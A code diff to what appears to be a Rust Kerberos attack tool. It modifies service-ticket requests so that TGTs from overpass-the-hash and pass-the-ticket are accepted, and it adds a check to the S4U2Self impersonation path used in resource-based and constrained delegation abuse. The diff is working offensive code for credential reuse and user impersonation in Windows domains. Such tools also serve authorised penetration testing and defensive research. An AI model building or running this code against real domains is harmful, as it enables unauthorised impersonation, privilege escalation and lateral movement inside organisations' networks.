@@ -569,7 +569,11 @@ pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<Servi
         vec![ap_req_padata(tgt)?],
         [0x40, 0x81, 0x00, 0x00], // forwardable | renewable | canonicalize
         vec![],
-        &[crate::ETYPE_AES256],
+        // Offer RC4 as well as AES256: a TGT from overpass-the-hash (NT hash → pass-the-ticket)
+        // has an RC4 session key, and an AES256-only request can draw KDC_ERR_ETYPE_NOSUPP. The
+        // reply session key is decrypted by dec_session(), which handles both; SMB signing uses a
+        // fresh AES128 subkey regardless, so the service-session etype does not matter downstream.
+        &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
     );
     let resp = kdc_exchange(
         kdc,
@@ -778,6 +782,19 @@ fn build_tgs_req(
 }
 
 fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
+    // The PA-FOR-USER checksum (cksumtype 16) is HMAC-SHA1-96-AES256, so it is only valid over a
+    // 32-byte AES256 TGT session key. An RC4 (16-byte) session key would need cksumtype -138
+    // (HMAC-MD5) instead — fail loudly rather than send a checksum the KDC will silently reject.
+    // In practice get_tgt() always yields AES256 (or bails on ETYPE_NOSUPP), so this only guards a
+    // future RC4/NT-hash-driven caller: RBCD needs a controlled account that has an AES key.
+    if tgt.session_key.len() != 32 {
+        bail!(
+            "S4U2Self (PA-FOR-USER) needs an AES256 TGT session key, got {} bytes — RBCD/constrained \
+             delegation requires a controlled account with an AES key (password- or machine-account \
+             based), not an RC4-only/NT-hash TGT",
+            tgt.session_key.len()
+        );
+    }
     // S4U checksum input: LE(name-type) || username || realm || auth-package.
     let mut s4u = Vec::new();
     s4u.extend_from_slice(&(NT_PRINCIPAL as i32).to_le_bytes());
